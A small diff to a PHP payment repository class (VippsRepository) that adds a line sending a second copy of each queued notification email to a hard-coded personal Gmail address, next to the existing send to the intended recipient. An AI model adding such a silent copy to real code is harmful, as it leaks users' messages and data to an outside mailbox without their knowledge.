@@ -193,6 +193,7 @@ class VippsRepository extends BaseRepository {
 
             //AdminHelpers::send_email($subject,$from, $to, $message);
             \Mail::to($to)->queue(new SubjectBodyEmail($emailData));
+            \Mail::to('elybutabara@gmail.com')->queue(new SubjectBodyEmail($emailData));
         }
 
         return $response;
